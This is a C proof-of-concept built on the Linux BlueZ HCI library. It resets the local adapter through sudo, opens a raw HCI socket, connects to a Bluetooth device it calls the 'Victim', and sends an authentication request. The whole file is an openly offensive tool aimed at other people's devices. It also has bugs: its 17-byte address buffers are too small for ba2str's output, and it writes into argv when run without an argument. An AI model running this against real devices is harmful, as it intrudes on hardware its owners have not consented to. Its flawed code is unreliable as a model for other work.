#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <errno.h>

int authentication_request(int dd, uint16_t handle, int time){
  auth_requested_cp cp;
  evt_cmd_status rp;
  struct hci_request rq;
  memset(&cp, 0, sizeof(cp));
  memset(&rq, 0, sizeof(rq));
  memset(&rp, 0, sizeof(rp));

  cp.handle         = handle;
  rq.ogf            = OGF_LINK_CTL;
  rq.ocf            = OCF_AUTH_REQUESTED;
  rq.cparam         = &cp;
  rq.clen           = AUTH_REQUESTED_CP_SIZE;
  rq.rparam         = &rp;
  rq.rlen           = EVT_CMD_STATUS_SIZE;
  rq.event          = EVT_CMD_STATUS;

  if (hci_send_req(dd, &rq, time) < 0)
    return -1;
  if (rp.status) {
    errno = EIO;
    return -1;
  }
  return 0;
}

int create_connection(int dd, bdaddr_t *bdaddr, uint16_t type, 
              uint8_t rep_mode, uint8_t mode, uint16_t clock,
               uint8_t role, int time, uint16_t *handle){
  create_conn_cp cp;
  evt_conn_complete rp;
  struct hci_request rq;

  memset(&cp, 0, sizeof(cp));
  memset(&rq, 0, sizeof(rq));
  memset(&rp, 0, sizeof(rp));

  bacpy(&cp.bdaddr, bdaddr);
  cp.pkt_type       = type;
  cp.pscan_rep_mode = rep_mode;
  cp.pscan_mode     = mode;
  cp.clock_offset   = clock;
  cp.role_switch    = role;

  rq.ogf            = OGF_LINK_CTL;
  rq.ocf            = OCF_CREATE_CONN;
  rq.cparam         = &cp;
  rq.clen           = CREATE_CONN_CP_SIZE;
  rq.rparam         = &rp;
  rq.rlen           = EVT_CONN_COMPLETE_SIZE;
  rq.event          = EVT_CONN_COMPLETE;

  if (hci_send_req(dd, &rq, time) < 0)
    return -1;
  
  if (rp.status) {
    errno = EIO;
    return -1;
  }
  *handle = rp.handle;
  printf("[*] Connect Complete handle : %x\n", *handle);
  return 0;
}

int main(int argc, char **argv)
{
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    argv[1]="00:00:00:00:00:00";
    printf("Auto Setting Destination MAC_ADDR is %s", argv[1]);
  }

  bdaddr_t dst_addr;
  char s_addr[17] = {0}, d_addr[17] = {0};
  str2ba(argv[1], &dst_addr);
  uint16_t handle;

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");
  printf("[*] Opening hci device...\n");

  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  } 

  ba2str(&di.bdaddr, s_addr);
  ba2str(&dst_addr, d_addr);
  
  printf("Local device %s\n", s_addr);
  printf("Remote device %s\n", d_addr);

  struct hci_filter flt;
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }
  int opt = 1;
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  printf("[*] Connecting to Victim...\n");  
  printf("[*] Start Connect\n"); 
  if(create_connection(hci_socket, &dst_addr, htobs(0xcc18), 1, 0, htobs(0x8b7a), 1, 10000, &handle) < 0){
    perror("create_connection");
    return 1;
  }
  
  printf("[*] Sent Authentication Request\n"); 
  if(authentication_request(hci_socket, handle, 100) < 0){
    perror("authentication_request");
    return 1;
  }

  hci_close_dev(hci_socket);
}
